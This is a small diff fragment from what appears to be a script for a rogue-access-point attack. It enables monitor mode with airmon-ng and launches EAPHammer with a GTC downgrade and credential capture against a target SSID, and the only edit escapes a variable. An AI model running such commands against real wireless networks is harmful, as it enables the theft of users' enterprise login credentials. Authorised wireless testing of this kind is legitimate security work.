@@ -451,7 +451,7 @@ sudo airmon-ng check kill
 sudo airmon-ng start $INTERFACE
 
 # Start EAPHammer with GTC downgrade:
-sudo python3 eaphammer -i ${INTERFACE} \\
+sudo python3 eaphammer -i \${INTERFACE} \\
   --essid "$TARGET_SSID" \\
   --channel "$CHANNEL" \\
   --creds \\
